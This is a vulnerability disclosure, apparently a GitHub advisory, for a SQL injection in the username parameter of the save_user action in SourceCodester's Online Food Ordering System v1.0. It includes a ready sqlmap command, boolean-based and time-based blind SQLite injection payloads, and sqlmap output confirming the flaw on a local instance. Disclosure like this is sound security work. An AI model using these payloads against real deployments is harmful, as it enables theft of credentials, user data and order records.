# SQL Injection in Online Food Ordering System

## Overview

* **Vulnerability Type**: SQL Injection
* **Vendor**: SourceCodester
* **Product**: [Online Food Ordering System](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
* **Version**: 1.0
* **Component**: User Management (`Actions.php?a=save_user`)
* **Vulnerable Parameter**: `username` (POST)

## Description

A SQL Injection vulnerability exists in **Online Food Ordering System v1.0**. The vulnerability is located in the `Actions.php` file, specifically within the `save_user` action.

The application fails to properly sanitize the `username` parameter in the HTTP POST request before processing it in a SQL query. This allows an authenticated attacker (or an attacker with access to the user creation interface) to inject arbitrary SQL commands. Since the backend database is **SQLite**, attackers can exploit this using Boolean-based inference or Time-based blind injection (utilizing heavy queries like `RANDOMBLOB`) to exfiltrate sensitive data from the database.

## Steps to Reproduce

1. **Setup**: Deploy the Online Food Ordering System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Run `sqlmap` against the captured request targeting the `username` parameter.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8088/Actions.php?a=save_user" \
--data "id=&fullname=Test+User&username=testuser" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Referer: http://127.0.0.1:8088/admin/?page=users" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Boolean-based Blind Payload:**

```sql
username=admin' AND 4611=4611 AND 'YtZs'='YtZs

```

**Time-based Blind Payload (SQLite):**

```sql
username=admin' AND 5832=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'Zrsm'='Zrsm

```

## Proof of Concept
The following output from `sqlmap` confirms that the `username` parameter is vulnerable. It successfully identified the backend as **SQLite** and provided payloads for both Boolean-based and Time-based blind injection.

```text
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 4611=4611 AND 'YtZs'='YtZs&password=admin123
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: username=admin' AND 5832=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'Zrsm'='Zrsm&password=admin123
    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)
---
[INFO] the back-end DBMS is SQLite
web server operating system: Linux Debian
web application technology: Apache 2.4.56, PHP 8.0.30
back-end DBMS: SQLite

```

<img width="1068" height="326" alt="图片" src="https://github.com/user-attachments/assets/1c0d1ad9-b28b-49f6-858f-b06006f7b2b4" />
<img width="1066" height="572" alt="图片" src="https://github.com/user-attachments/assets/ee54e1a4-023a-4618-8861-22801b5a5342" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Dump the entire SQLite database file content (including admin credentials, user data, and order history).
2. **Authentication Bypass**: Potentially bypass authentication mechanisms by manipulating SQL logic.
3. **Database Enumeration**: Identify tables and column structures.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
